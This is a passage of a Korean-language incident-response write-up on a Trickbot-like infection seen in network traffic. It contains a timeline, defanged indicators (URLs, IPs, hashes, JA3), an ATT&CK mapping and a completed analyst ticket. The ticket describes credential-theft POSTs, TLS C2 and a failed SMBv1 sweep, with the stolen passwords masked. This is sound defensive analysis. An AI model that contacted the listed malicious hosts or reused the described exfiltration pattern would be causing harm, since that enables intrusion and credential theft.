내부 목적지 중 DC는 뺍니다(DC와는 원래 통신하니까).

```text
UDP 137/138 → 10.3.11.255   single packets at 21:23, 21:27, 21:35, 21:47, 21:59   (normal NetBIOS)
UDP 137/138 → 10.3.11.255   burst 21:36:19–21:37:21 (22 + 21 packets)             (= "net view" from the /90 dump)
TCP 445 at 21:36:47 (same second, src ports 49818…49929):
    → 10.3.11.119  smb ×3 (5 pkts, 51 databytes) + 1 no data
    → 10.3.11.218  smb ×2 (5 pkts, 51 databytes) + 1 no data
    → 10.3.11.1    2 pkts, 0 databytes
    → 10.3.11.254  1 pkt     → 10.3.11.131  1 pkt     (no answer: probably no host there)
TCP 445 at 21:37:17 → 10.3.11.119, 10.3.11.218  smb (5 pkts, 51 databytes)
```

- `10.3.11.255`는 망 전체 **브로드캐스트**, 137/138은 NetBIOS. 몰린 구간은 업로드 내용에 있던 `net view /all`과 시간이 같습니다 — 호스트 증거와 네트워크 증거가 같은 순간에 맞아떨어집니다.
- **1초 안에 445로 다섯 주소**, 출발지 포트가 줄줄이 이어짐 = 사람이 아니라 **스캔**.

SMB 세션 하나 열기(21:37:17, `10.3.11.194:50097 → 10.3.11.119:445`):

```text
TCP Flags  SYN 1  SYN-ACK 1  ACK 1  PSH 1  RST 1
Src payload  "\xffSMBr … NT LM 0.12"     ← SMBv1 Negotiate Protocol Request, SMBv1 dialect only
Dst          2 packets, 120 bytes, 0 databytes  (SYN-ACK + RST, no SMB reply)
```

대상이 **SMBv1을 거절**했습니다(윈도우 10에서 비활성). 공유 폴더, 계정, 파일 흔적 없음. SMBv1만 골라 찔러 보는 건 EternalBlue 유형 웜 확산에서 흔합니다([EternalBlue / SMBv1](../../adversary/eternalblue-smbv1.md)). **시도했지만 실패.**

### 다른 PC가 IOC와 통신했나? { #other-victims }

```text
ip.dst == [50.87.248.17, 64.44.133.131, 203.176.135.102, 190.214.13.2, 185.14.31.98, 185.180.198.50, 51.254.164.244, 45.148.120.153, 199.247.13.144, 209.97.130.197] && ip.src != 10.3.11.194
```

**결과 0개.** 감염 PC는 LAPTOP-7XMV2SN 한 대뿐이고, .119와 .218은 네트워크 데이터상 감염 흔적이 없습니다.

---

## 타임라인 { #timeline }

| UTC (2020-03-11) | 이벤트 |
|---|---|
| 21:22:35 | 캡처 시작 |
| 21:24:36 | 스크립트(`WinHttp.WinHttpRequest.5`)가 bolton-tech[.]com에서 `YAS20.exe` 다운로드 |
| 21:31:58–59 | filmstore[.]xyz, 51.254.164.244(자체 서명)로 TLS |
| 21:32:00 | 공인 IP 확인, checkip.amazonaws[.]com |
| 21:32:07 | 190.214.13.2:449로 첫 TLS C2 |
| 21:35:31 | 185.180.198.50:447로 C2 시도 — 응답 없음 |
| 21:35:53 | 185.14.31.98:447에서 2.1MB 다운로드 |
| 21:36:19–21:37:21 | NetBIOS 몰림(`net view`) |
| 21:36:45–21:37:28 | 64.44.133.131에서 "PNG" 다운로드 |
| 21:36:47, 21:37:17 | 445 SMBv1 스캔 — 거절 |
| 21:36:52–21:37:52 | 203.176.135.102:8082로 `/81/` 비밀번호 POST 4개 |
| 21:36:59–21:38:49 | `/90` 정찰 POST(5,366바이트) |
| 21:42–21:46 | C2(449)와 다운로드(447, 443) 추가 |
| 21:46:06 | 마지막 악성 세션 종료 |
| 22:06:41 | 캡처 끝 |

## 침해 지표(IOC) { #iocs }

| 종류 | 지표 | 역할 |
|---|---|---|
| URL | `hxxp://bolton-tech[.]com/YAS20.exe` | 1단계 다운로드 |
| IP | `50.87.248[.]17` | bolton-tech.com(공유 호스팅) |
| URL | `hxxp://64.44.133[.]131/images/cursor.png`, `/images/imgpaper.png` | 위장 페이로드 |
| URL | `hxxp://203.176.135[.]102:8082/yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/81/` (`/90`) | HTTP 유출 |
| IP:포트 | `190.214.13[.]2:449` | TLS C2 |
| IP:포트 | `185.14.31[.]98:447` | TLS 다운로드, 자체 서명 인증서 |
| IP:포트 | `185.180.198[.]50:447` | C2(응답 없음) |
| IP | `51.254.164[.]244` | TLS 443, 자체 서명 |
| 도메인/IP | `filmstore[.]xyz` 45.148.120[.]153, `hakunamatatata[.]com` 199.247.13[.]144, `helpforyourservice[.]com` 209.97.130[.]197 | 수상한 TLS 다운로드 |
| 인증서 | CN `example.com`, O `Global Security`, OU `IT Department`, 시리얼 `008be295cd71603289` | C2 서버 인증서 |
| JA3 / JA3S | `72a589da586844d7f0818ce684948eea` / `e35df3e00ca4ef31d42b34bebaa2f86e` | 클라이언트/서버 TLS 지문(윈도우 API를 쓰는 정상 프로그램과 JA3가 같을 수 있음) |
| MD5 | `179345004c39336eaba39863b95f268b`, `9dfb3952172deeddb3a5e3cafed933bc`, `e40d7846eae7d8a98c0e3512e5461e4c` | 다운로드 3건의 HTTP 본문 |
| User-Agent | `KSKJJGJ`, `WinHTTP loader/1.0`, `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)` | 악성 모듈 |
| 프로세스 | `VMMM;;;;영상ثافوزبت.exe` | 업로드된 프로세스 목록에서 나온 호스트 IOC |
| 도메인 | `checkip.amazonaws[.]com` | IP 확인에 악용된 정상 서비스(참고용) |

## ATT&CK 매핑 { #attack }

| 기법 | 증거 |
|---|---|
| T1059 Command and Scripting Interpreter | `WinHttp.WinHttpRequest.5` 다운로드(스크립트는 추정) |
| T1105 Ingress Tool Transfer | YAS20.exe, "png" 페이로드, 447/443 다운로드 |
| T1016.001 Internet Connection Discovery | checkip.amazonaws.com |
| T1057, T1082, T1016, T1482, T1087 Discovery | proclist, systeminfo, ipconfig, net, nltest, 관리자 이름 |
| T1555.003 Credentials from Web Browsers | `/81/` IE, Firefox 비밀번호 |
| T1071.001 Web Protocols, T1573 Encrypted Channel | HTTP 8082, TLS 449/447 C2 |
| T1041 Exfiltration Over C2 Channel | `/81/`, `/90` POST |
| T1021.002 SMB/Windows Admin Shares(시도) | 445 SMBv1 스캔, 거절 |

---

## 침해사고 티켓 { #ticket }

티켓은 팀 표준 양식을 따릅니다. 기억할 규칙:

- **설명은 두 문단 이내**지만 내부 IP + 호스트이름, 외부 IP + 도메인, 프로토콜과 포트, 방향(누가 먼저 연결했나), 파일 이름, 악성 여부와 악성코드 종류, 공격 단계(C2 간격과 상태, 유출 시간·내용·바이트·방법)가 모두 들어가야 합니다.
- **검색 쿼리**는 운영 중인 네트워크에서 관심 트래픽만 나올 만큼 구체적이어야 합니다.
- **작업 로그**: 행동 하나에 한 줄, 끝은 **Found / Not Found / Further Analysis Required**, 줄마다 고유한 `[시간, 작업자]` 도장.
- **도구 출력 / 노트**: 로그 줄과 **같은 도장**(Ctrl+F로 둘 다 찾힘), 타임스탬프, 출발지/목적지, 관련 필드 전부.
- 도메인은 무력화(`[.]`)하고 **비밀 정보는 가립니다**.

아래의 작업자 이름, 티켓 링크, 증거 경로는 자리표시이고 작업 로그 시간은 예시입니다.

```text
#INDEX ENTRY#

[] -- 200311 2124 -- 10.3.11.194 LAPTOP-7XMV2SN -- Malware infection (Trickbot-like): exe download, credential theft and recon exfil via HTTP, TLS C2, failed SMB lateral movement -- <ticket-link>


#TICKET METADATA#

OPERATORS: <Analyst>

TIME OF INCIDENT: 200311 21:24:36 UTC

RELATED TICKETS:
N/A

DESCRIPTION OF INVESTIGATION:

At 200311 21:24:36 UTC LAPTOP-7XMV2SN (10.3.11.194, user otis.witherspoon, domain MONDOGREEK) made an HTTP GET (port 80) to 50.87.248.17 (bolton-tech[.]com) and downloaded the Windows executable YAS20.exe (466,944 bytes, application/x-msdownload). The request used the script User-Agent "WinHttp.WinHttpRequest.5" with no Referer, indicating it was fetched by a malicious script/document rather than a user browser. At 21:32:00 the host checked its public IP via checkip.amazonaws[.]com and from 21:32:07 established encrypted C2 over TLS to 190.214.13.2:449 (long-lived, low-byte sessions of 7-28 KB lasting 1-4 min, no fixed beacon interval, last session ended 21:46:06). A second C2 address 185.180.198.50:447 was attempted at 21:35:31 with no response. Additional payloads were downloaded: ~2.2 MB over TLS from 185.14.31.98:447 (self-signed cert CN example[.]com / O "Global Security" / OU "IT Department", created 200306), and cursor.png / imgpaper.png (~570 KB each, application/octet-stream, likely disguised executables) via HTTP from 64.44.133.131:80 using User-Agent "WinHTTP loader/1.0". Further encrypted downloads on 443 were made to hakunamatatata[.]com (199.247.13.144, 570 KB), helpforyourservice[.]com (209.97.130.197, 281 KB), filmstore[.]xyz (45.148.120.153) and 51.254.164.244 (self-signed); contents unknown.

Exfil occurred between 21:36:52 and 21:38:49 UTC via five cleartext HTTP POSTs (multipart/form-data) from 10.3.11.194 to 203.176.135.102:8082, URI /yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/<81|90>. Four /81/ POSTs (210-551 bytes) sent stolen browser credentials by source: IE passwords (facebook.com login for otis.witherspoon@mondogreek[.]com), Firefox passwords (accounts.firefox.com login with the SAME password, plus Firefox account tokens), and empty reports for OpenVPN configs and OpenSSH keys. The /90 POST (5,366 bytes) sent a full process list (incl. anomalous process "VMMM;;;;영상ثافوزبت.exe"), systeminfo and the output of ipconfig /all, net config workstation, net view /all (/domain), nltest /domain_trusts (/all_trusts), DC name Mondogreek-DC.mondogreek[.]com and admin account names. At 21:36:47 and 21:37:17 the host swept SMB port 445 on 10.3.11.119, 10.3.11.218, 10.3.11.1, 10.3.11.131 and 10.3.11.254 with SMBv1-only (NT LM 0.12) negotiate probes; all were refused (RST, 0 bytes returned), so lateral movement was attempted but NOT successful. No other internal host contacted any of the external IOCs. Determination: MALICIOUS - banking trojan / information stealer with modular downloader, pattern consistent with Trickbot (group tag "yas20"; unconfirmed, closed network). Credentials for otis.witherspoon are compromised. Further malware analysis of YAS20.exe, cursor.png and imgpaper.png is required.


#IMPACTED MACHINES#

INTERNAL IP/s & HOSTNAME/s:
10.3.11.194 LAPTOP-7XMV2SN (user otis.witherspoon, MAC b8:ca:3a:ec:3b:8f, Windows 10 Pro build 18363)

INTERNAL SOURCE PORT/s: (If Ephemeral Leave Blank.)

LATERAL DESTINATION IP/s & HOSTNAME/s: (attempted only - refused)
10.3.11.119 LAPTOP-SQSA42O
10.3.11.218 LAPTOP-I9ZPI04
10.3.11.1 (default gateway)
10.3.11.131 (no response)
10.3.11.254 (no response)

LATERAL DESTINATION PORT/s:
Port 445 - SMB (SMBv1 negotiate probe)


#EXTERNAL MACHINES#

EXTERNAL IP/s & HOSTNAME/s:
50.87.248.17 (bolton-tech[.]com) - YAS20.exe download (HTTP 80)
64.44.133.131 - cursor.png / imgpaper.png download (HTTP 80)
203.176.135.102 - HTTP C2 / exfil (HTTP 8082)
190.214.13.2 - TLS C2 (449)
185.14.31.98 - TLS download channel, self-signed cert example[.]com (447)
185.180.198.50 - C2 attempted, no response (447)
51.254.164.244 - TLS, self-signed cert (443)
45.148.120.153 (filmstore[.]xyz) - TLS (443)
199.247.13.144 (hakunamatatata[.]com) - TLS download 570 KB (443)
209.97.130.197 (helpforyourservice[.]com) - TLS download 281 KB (443)
18.235.112.207 (checkip.amazonaws[.]com) - legitimate service, public IP lookup by malware (context only)

EXTERNAL SOURCE PORT/s: (If Ephemeral Leave Blank.)

EXTERNAL DESTINATION PORT/s:
Port 80 - HTTP
Port 8082 - HTTP (non-standard)
Port 449 - TLS (non-standard)
Port 447 - TLS (non-standard)
Port 443 - TLS


#SEARCH QUERIES#

ARKIME (MOLOCH):
ip == 10.3.11.194 && ip == [50.87.248.17, 64.44.133.131, 203.176.135.102, 190.214.13.2, 185.14.31.98, 185.180.198.50, 51.254.164.244, 45.148.120.153, 199.247.13.144, 209.97.130.197]
ip.src == 10.3.11.194 && ip.dst == 10.3.11.0/24 && port.dst == 445

SPLUNK: (not run - Arkime-only analysis; equivalent Zeek query)
index=zeek sourcetype=conn:zeek id_orig_h=10.3.11.194 AND id_resp_h IN (50.87.248.17, 64.44.133.131, 203.176.135.102, 190.214.13.2, 185.14.31.98, 185.180.198.50, 51.254.164.244, 45.148.120.153, 199.247.13.144, 209.97.130.197)


#EVIDENCE LOCATIONS#

Team1: /home/<analyst>/evidence/200311_LAPTOP-7XMV2SN_YAS20_exe_download.pcap
Team1: /home/<analyst>/evidence/200311_LAPTOP-7XMV2SN_png_payload_download.pcap
Team1: /home/<analyst>/evidence/200311_LAPTOP-7XMV2SN_http8082_exfil_POST.pcap
Team1: /home/<analyst>/evidence/200311_LAPTOP-7XMV2SN_tls_c2_449_447.pcap
Team1: /home/<analyst>/evidence/200311_LAPTOP-7XMV2SN_smb445_sweep.pcap
(Exported from Arkime "Download PCAP". Full credentials/tokens are in the exfil PCAP only - masked in this ticket.)


#OPERATION LOG / ANALYST NOTES#

[251117 2000, Analyst] Establishing data time range and session count - Found
[251117 2003, Analyst] Reviewing protocol distribution and internal hosts - Found
[251117 2010, Analyst] Identifying host roles (DC) - Found
[251117 2015, Analyst] Mapping internal IPs to hostnames/users via Kerberos cname - Found
[251117 2020, Analyst] Checking external IP 52.242.211.89 seen as session initiator (possible inbound) - Not Found
[251117 2030, Analyst] Reviewing cleartext HTTP for executable downloads, raw-IP hosts, POST requests and unusual user agents - Found
[251117 2045, Analyst] Building timeline of suspicious HTTP sessions - Found
[251117 2105, Analyst] Collecting file type / Body MD5 of downloads from bolton-tech.com and 64.44.133.131 - Found
[251117 2110, Analyst] Inspecting POST /90 to 203.176.135.102:8082 for data upload - Found
[251117 2115, Analyst] Reviewing content of POST /90 body for exfiltrated data - Found
[251117 2120, Analyst] Reviewing content of POST /81/ body for exfiltrated data - Found
[251117 2125, Analyst] Reviewing remaining /81/ POSTs for credential sources - Found
[251117 2135, Analyst] Hunting outbound connections from 10.3.11.194 on non-standard ports - Found
[251117 2140, Analyst] Reviewing TLS certificates from 10.3.11.194 for self-signed / anomalous issuers - Found
[251117 2150, Analyst] Building timeline of TLS sessions to suspicious IPs / certificates (C2 hunt) - Found
[251117 2155, Analyst] Verifying self-signed certificate on 185.14.31.98:447 - Found
[251117 2205, Analyst] Checking for lateral movement from 10.3.11.194 to other internal hosts - Found
[251117 2210, Analyst] Verifying outcome of SMB probe to 10.3.11.119:445 - Not Found (no successful lateral movement)
[251117 2212, Analyst] Checking whether any other internal host contacted the external IOCs - Not Found

[Time -- Operator]

Tool Output / Notes:

[251117 2000, Analyst] Arkime, time range All. Data range 2020-03-11 21:22:35 - 22:06:41 UTC (44:06). 1,131 total sessions. Display timezone set to UTC.

[251117 2003, Analyst] SPI View (no filter). Internal network 10.3.11.0/24.
Src IP: 10.3.11.119 (491), 10.3.11.194 (377), 10.3.11.218 (259), 10.3.11.3 (3), 52.242.211.89 (1)
Protocols: tcp 672, udp 458, tls 349, dns 325, http2 126, ldap 79, krb5 78, http 44, dcerpc 41, smb 30, llmnr 29, ssdp 16, ntp 9, mdns 8, quic 6, igmp 1
Active Directory environment (ldap/krb5/dcerpc/smb). 3 workstations + 1 server.

[251117 2010, Analyst] Query: ip.dst == 10.3.11.3 -> 571 sessions. Protocols: udp 371, dns 325, tcp 200, ldap 79, krb5 78, dcerpc 41, smb 24, ntp 9. Src: 10.3.11.119 (251), 10.3.11.194 (170), 10.3.11.218 (150).
10.3.11.3 = Domain Controller / DNS (all krb5/ldap terminate here).

[251117 2015, Analyst] Query: ip.src == 10.3.11.0/24 && protocols == krb5 -> SPI View krb5 (cname/realm/sname).
Realm: MONDOGREEK.COM. DC: Mondogreek-DC.mondogreek.com (sname cifs/ldap)
10.3.11.3   Mondogreek-DC
10.3.11.119 LAPTOP-SQSA42O  user dorian.neff
10.3.11.194 LAPTOP-7XMV2SN  user otis.witherspoon
10.3.11.218 LAPTOP-I9ZPI04  user dominga.mcdowell

[251117 2020, Analyst] Query: ip.src == 52.242.211.89 -> 1 session.
200311 21:32:00 UTC 52.242.211.89:443 {ARIN} -> 10.3.11.194:50355 tcp, 2 packets, 283 bytes. TCP flags SYN 0 SYN-ACK 0 PSH 1 RST 1. Src MAC 20:e5:2a:b6:93:f1 (Netgear, gateway), Dst MAC b8:ca:3a:ec:3b:8f (Dell). Payload encrypted TLS record.
No handshake captured; mid-session server packet on 443 answered by client RST. Not an inbound connection. Benign.

[251117 2030, Analyst] Query: ip.src == 10.3.11.0/24 && protocols == http -> 44 sessions. SPI View http:
Body Magic: application/x-dosexec (2), application/octet-stream (2). Response content-type application/x-msdownload (1).
Request Method: GET 39, POST 5. Request content-type multipart/form-data (5, random boundaries).
Suspicious URIs:
 bolton-tech.com/YAS20.exe (1)
 64.44.133.131/images/cursor.png (2), 64.44.133.131/images/imgpaper.png (1)
 203.176.135.102:8082/yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/81/ (4), /90 (1)
 checkip.amazonaws.com/ (1)
Unusual User-Agents: KSKJJGJ (1), WinHTTP loader/1.0 (1), Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5) (1), Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E) (4)
Benign: ctldl.windowsupdate.com, ocsp.digicert.com, crl.securetrust.com (Microsoft-CryptoAPI/10.0), fonts.googleapis.com / fonts.gstatic.com, *.wsimg.com, notable-quotes.com, newegg.com, tuscaloosabarnyard.com (user browsing, Edge/Chrome UA).
C2 URI contains victim hostname LAPTOP-7XMV2SN + Windows build 18363 + bot ID.

[251117 2045, Analyst] Query: host.http == bolton-tech.com || ip.dst == 64.44.133.131 || ip.dst == 203.176.135.102 || host.http == checkip.amazonaws.com -> 9 sessions, all from 10.3.11.194.
200311 21:24:36UTC 10.3.11.194 49727 50.87.248.17 80 GET 200 bolton-tech.com /YAS20.exe 1.1 Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
  Request headers only: Connection, Accept */*, User-Agent, Host (no Referer). Response: Server Apache, Content-Type application/x-msdownload, Content-Length 466944, Last-Modified Tue, 10 Mar 2020 11:32:37 GMT, host-header c2hhcmVkLmJsdWVob3N0LmNvbQ== (CyberChef From Base64 = shared.bluehost.com -> shared hosting, likely compromised site). 389 pkts, 488,507 bytes.
200311 21:32:00UTC 10.3.11.194 49787 18.235.112.207 80 GET checkip.amazonaws.com / (11 pkts, 950 bytes) - public IP check 7.5 min after download
200311 21:36:45UTC 10.3.11.194 49816 64.44.133.131 80 GET /images/cursor.png + /images/imgpaper.png (979 pkts, 1,218,352 bytes)
200311 21:36:52UTC 10.3.11.194 50080 203.176.135.102 8082 POST /yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/81/ (1,396 bytes)
200311 21:36:55UTC 10.3.11.194 50081 203.176.135.102 8082 POST .../81/ (1,673 bytes)
200311 21:36:57UTC 10.3.11.194 50082 64.44.133.131 80 GET /images/cursor.png (540 pkts, 611,579 bytes)
200311 21:36:59UTC 10.3.11.194 50091 203.176.135.102 8082 POST .../90 (6,771 bytes)
200311 21:37:19UTC 10.3.11.194 50098 203.176.135.102 8082 POST .../81/ (1,341 bytes)
200311 21:37:52UTC 10.3.11.194 50099 203.176.135.102 8082 POST .../81/ (1,332 bytes)
No further HTTP to these IPs until end of capture (22:06:41).

[251117 2105, Analyst] Query: host.http == bolton-tech.com || ip.dst == 64.44.133.131 -> 3 sessions.
Body Magic: application/x-dosexec (2).
Body MD5: 179345004c39336eaba39863b95f268b, 9dfb3952172deeddb3a5e3cafed933bc, e40d7846eae7d8a98c0e3512e5461e4c (HTTP bodies of YAS20.exe / cursor.png / imgpaper.png; per-file mapping not confirmed). Hash lookup not possible (closed network) - for malware analysis.
64.44.133.131 responses: HTTP/1.1 200 OK, Server nginx/1.6.2, malformed header "Content-Type: Content-type: application/octet-stream".
 imgpaper.png Content-Length 582656 (Date 21:36:59 GMT); cursor.png Content-Length 582144 (Date 21:37:06 GMT).
 Requests: GET /images/<file>.png, Cache-Control no-cache, Pragma no-cache, User-Agent WinHTTP loader/1.0, Host 64.44.133.131.
~570 KB "png" files from raw IP via downloader UA -> likely disguised executables.

[251117 2110, Analyst] /90 session: 200311 21:36:59-21:38:49 UTC 10.3.11.194 50091 203.176.135.102 {APNIC} 8082
POST /yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/90 HTTP/1.1, User-Agent KSKJJGJ, Content-Type multipart/form-data; boundary=aksgja8s8d8a8s97, Content-Length 5366, Cache-Control no-cache.
Src 10 pkts 6,161 bytes (databytes 5,609) / Dst 9 pkts 610 bytes (databytes 120) -> upload.
Response: 200 OK, server Cowboy, Content-Type text/plain, content-length 3, body "/1/" (acknowledgement).
Body MD5s: f09673ad745e39470708028f7431f6d6, fa06d89c65fb808240e37f4c9e128955.

[251117 2115, Analyst] /90 POST body (Packet Options > Hide Images & Files, ascii). Cleartext, 2 parts:
 name="proclist": "***TASK LIST***" full process list - System, smss.exe, csrss.exe, wininit.exe, winlogon.exe, services.exe, lsass.exe, svchost.exe ..., MsMpEng.exe, NisSrv.exe, explorer.exe, OfficeClickToRun.exe ...
   Anomalous process: "VMMM;;;;영상ثافوزبت.exe" (mixed Latin/Korean/Arabic) - likely malware process. Host IOC.
 name="sysinfo": "***SYSTEMINFO***" HostName LAPTOP-7XMV2SN, OSName Microsoft Windows 10 Pro, 64-bit, Workstation, RegisteredOwner admin, TotalPhysicalMemory 6493 Mb
   /c ipconfig /all - Host LAPTOP-7XMV2SN, DNS suffix mondogreek.com, MAC B8-CA-3A-EC-3B-8F, IPv4 10.3.11.194/24, GW 10.3.11.1, DHCP/DNS 10.3.11.3
   /c net config workstation - \\LAPTOP-7XMV2SN, user otis.witherspoon, domain MONDOGREEK
   /c net view /all ; /c net view /all /domain - System error 6118
   /c nltest /domain_trusts ; /c nltest /domain_trusts /all_trusts - 0: MONDOGREEK mondogreek.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)
   ***LOCAL MACHINE DATA*** User CN=Otis Witherspoon,CN=Users,DC=mondogreek,DC=com; Computer CN=LAPTOP-7XMV2SN,CN=Computers,DC=mondogreek,DC=com; Domain controller Mondogreek-DC.mondogreek.com; Admin Name: Administrator (x3)
 MAC in ipconfig matches Arkime Src Ethernet b8:ca:3a:ec:3b:8f.
Exfil of host/network/domain reconnaissance. ATT&CK: T1057, T1082, T1016, T1482, T1087 (Discovery); T1041 (Exfiltration Over C2 Channel). Domain trust and admin enumeration = preparation for lateral movement.

[251117 2120, Analyst] 200311 21:36:52-21:36:54 UTC 10.3.11.194 50080 203.176.135.102 8082 POST .../81/
User-Agent Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E), Accept */*, boundary ---------ATBOXLGQOOBDZTLA, Content-Length 274, Connection Close.
 name="data": https://www.facebook.com/|otis.witherspoon@mondogreek.com|P@ss********  (URL|user|password, cleartext - masked, full value in PCAP)
 name="source": IE passwords
Response 200, server Cowboy, content-length 3.
Credential theft from browser store. ATT&CK T1555.003, T1041.

[251117 2125, Analyst] Remaining /81/ POSTs (same fake MSIE 7.0 UA, random boundaries, reply "/1/"):
200311 21:36:55UTC 10.3.11.194 50081 -> 203.176.135.102 8082, Content-Length 551, boundary ---------XWQEFTQLCLTQBJQE, source "firefox passwords"
 data: chrome://FirefoxAccounts|<account id>|{"version":1,"accountData":{"keyFetchToken":"<masked>","unwrapBKey":"<masked>"}} ; https://accounts.firefox.com|otis.witherspoon@mondogreek.com|P@ss******** (same password as Facebook) ; "No passwords found"
200311 21:37:19UTC 10.3.11.194 50098 -> 203.176.135.102 8082, Content-Length 219, boundary ---------MDLIZHCZZMRSOFHE, source "OpenVPN passwords and configs", data empty
200311 21:37:52UTC 10.3.11.194 50099 -> 203.176.135.102 8082, Content-Length 210, boundary ---------TAGOVQVWGJFPBAJU, source "OpenSSH private keys", data empty
/81/ = credential module reporting per source. Password reuse across sites -> high risk the domain password is the same. OpenVPN/OpenSSH: nothing stolen.

[251117 2135, Analyst] Query: ip.src == 10.3.11.194 && ip.dst != 10.0.0.0/8 && port.dst != 80 && port.dst != 443 && port.dst != 53 -> 26 sessions.
Dst IP: 190.214.13.2 (6), 224.0.0.252 (6), 203.176.135.102 (5), 185.14.31.98 (3), 239.255.255.250 (3), 224.0.0.251 (2), 185.180.198.50 (1)
Protocols: tcp 15, udp 11, tls 9, llmnr 6, http 5, ssdp 3, mdns 2
224.0.0.252 / 239.255.255.250 / 224.0.0.251 = LLMNR / SSDP / mDNS multicast (benign). 9 TLS sessions on non-standard ports to raw external IPs.

[251117 2140, Analyst] Query: ip.src == 10.3.11.194 && protocols == tls -> SPI View cert. Mostly Microsoft / Baltimore / DigiCert / Let's Encrypt (benign).
Anomalous: Issuer & Subject CN example.com (4), Issuer & Subject ON "Global Security" / OU "IT Department" (4); Issuer & Subject ON "Internet Widgits Pty Ltd" (2, OpenSSL default); Subject CN filmstore.xyz (1), hakunamatatata.com (1), helpforyourservice.com (1); Issuer cPanel, Inc. (1).

[251117 2150, Analyst] Query: ip.src == 10.3.11.194 && (ip.dst == 190.214.13.2 || ip.dst == 185.14.31.98 || ip.dst == 185.180.198.50 || cert.issuer.cn == example.com || cert.issuer.on == "Internet Widgits Pty Ltd" || cert.subject.cn == [filmstore.xyz, hakunamatatata.com, helpforyourservice.com]) -> 14 sessions:
200311 21:31:58UTC 10.3.11.194 49783 45.148.120.153 443 tls, cert:certificate-authority (cPanel), Alt Name filmstore.xyz, cpanel.filmstore.xyz, cpcalendars.filmstore.xyz - 68 pkts, 62,330 bytes
200311 21:31:59UTC 10.3.11.194 49784 51.254.164.244 443 tls, cert:self-signed - 107 pkts, 61,538 bytes
200311 21:32:07UTC 10.3.11.194 49788 190.214.13.2 449 tls - 32 pkts, 7,821 bytes (until 21:33:16)
200311 21:35:31UTC 10.3.11.194 49793 185.180.198.50 447 tcp - 6 pkts, 0 databytes / 384 bytes (no response)
200311 21:35:53UTC 10.3.11.194 49808 185.14.31.98 447 tls, cert:self-signed - 1,666 pkts, 2,049,123 databytes / 2,139,108 bytes (until 21:38:14)
200311 21:35:55UTC 10.3.11.194 49809 190.214.13.2 449 tls - 136 pkts, 27,788 bytes (until 21:39:37)
200311 21:35:58UTC 10.3.11.194 49810 190.214.13.2 449 tls - 117 pkts, 22,607 bytes (until 21:39:31)
200311 21:37:01UTC 10.3.11.194 50092 190.214.13.2 449 tls - 48 pkts, 7,801 bytes (until 21:39:57)
200311 21:42:12UTC 10.3.11.194 50112 190.214.13.2 449 tls - 52 pkts, 11,301 bytes (until 21:46:06)
200311 21:42:13UTC 10.3.11.194 50113 185.14.31.98 447 tls, cert:self-signed - 35 pkts, 24,643 bytes
200311 21:42:17UTC 10.3.11.194 50114 190.214.13.2 449 tls - 43 pkts, 7,964 bytes (until 21:46:06)
200311 21:43:40UTC 10.3.11.194 50128 199.247.13.144 443 tls, cert:certificate-authority, Alt Name hakunamatatata.com - 518 pkts, 569,667 bytes
200311 21:43:51UTC 10.3.11.194 50131 209.97.130.197 443 tls, cert:certificate-authority, Alt Name helpforyourservice.com - 243 pkts, 281,286 bytes
200311 21:44:02UTC 10.3.11.194 50136 185.14.31.98 447 tls, cert:self-signed - Src 29 pkts 2,185 bytes / Dst 82 pkts 111,326 bytes (download)
C2 assessment: 190.214.13.2:449 = persistent C2 (long-lived low-byte sessions, no fixed interval, active 21:32:07-21:46:06). 185.14.31.98:447 = module/payload download channel. 185.180.198.50:447 = C2 attempted, unreachable. No C2 traffic after 21:46:06.

[251117 2155, Analyst] Session 200311 21:44:02 10.3.11.194:50136 -> 185.14.31.98:447 {RIPE}
TLSv1.2, TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384, JA3 72a589da586844d7f0818ce684948eea, JA3S e35df3e00ca4ef31d42b34bebaa2f86e, JA4 t12i190700_d83cc789557e_16bbda4055b2
Certificate (single): Serial 008be295cd71603289, Not Before 2020/03/06 09:53:10 UTC, Not After 2021/03/06 09:53:10 UTC (365 days)
Issuer CN example.com, O Global Security, OU IT Department = Subject CN example.com, O Global Security, OU IT Department -> self-signed confirmed. Certificate created 5 days before incident.

[251117 2205, Analyst] Query: ip.src == 10.3.11.194 && ip.dst == 10.3.11.0/24 && ip.dst != 10.3.11.3 -> 20 sessions.
UDP 137/138 -> 10.3.11.255 single packets at 21:23:00, 21:23:05, 21:27:02, 21:35:00, 21:47:02, 21:59:04 (normal NetBIOS). Burst 21:36:19-21:37:21 (udp 137: 22 pkts 2,024 bytes; udp 138: 21 pkts 4,536 bytes) = "net view /all" seen in /90 exfil.
TCP 445 sweep at 200311 21:36:47UTC (sequential src ports 49818-49929):
 10.3.11.194 -> 10.3.11.119 445 smb x3 (5 pkts, 51 databytes / 345 bytes) + tcp x1 (6 pkts, 0 databytes)
 10.3.11.194 -> 10.3.11.218 445 smb x2 (5 pkts, 51 / 345) + tcp x1 (6 pkts, 0 databytes)
 10.3.11.194 -> 10.3.11.1 445 (2 pkts, 0 databytes); -> 10.3.11.254 445 (1 pkt); -> 10.3.11.131 445 (1 pkt) - no response
200311 21:37:17UTC 10.3.11.194 50097 -> 10.3.11.119 445 smb; 10.3.11.194 50095 -> 10.3.11.218 445 smb (5 pkts, 51 / 345 each)
Lateral movement attempt via SMB (ATT&CK T1021.002 attempt).

[251117 2210, Analyst] Session 200311 21:37:17 10.3.11.194:50097 -> 10.3.11.119:445 (Dst MAC 10:98:36:59:9d:cc Dell)
TCP flags SYN 1, SYN-ACK 1, ACK 1, PSH 1, RST 1. Src payload "\xffSMB r" = SMBv1 Negotiate Protocol Request offering only dialect "NT LM 0.12". Dst: 2 packets, 120 bytes, 0 databytes (SYN-ACK + RST, no SMB response).
